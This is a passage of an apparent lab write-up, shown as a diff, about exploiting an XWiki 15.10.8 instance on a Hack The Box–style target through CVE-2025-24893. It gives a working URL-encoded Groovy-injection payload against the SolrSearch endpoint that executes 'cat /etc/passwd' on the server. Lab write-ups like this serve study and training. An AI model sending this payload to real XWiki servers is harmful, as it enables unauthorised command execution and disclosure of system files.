@@ -126,4 +126,22 @@ On the bottom of the page we can see the version for the Xwiki running.
 | :------------------------: |
 | ***XWiki Debian 15.10.8*** |
 
-Now a simple search for the version showed us that there is a known CVE for xwiki for platform version 15.10.10.
+Now a simple search for the version showed us that there is a known CVE for xwiki for platform version 15.10.10 [CVE-2025-24893](https://www.exploit-db.com/exploits/52136)
+
+### CVE-2025-24893
+Since the version wiki.editor.htb is running is lower we can try to exploit it using the above exploit.
+I tried using the exploit but it has many errors so i switched to github and used it and it was not detecting if the website was vulnerable or not
+
+![[Editor-04.png]]
+
+So what i did copy pasted the exploit manually on from the exploit db
+
+```http
+/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
+```
+
+and mixed with my url the final payload becomes
+
+```http
+http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
+```
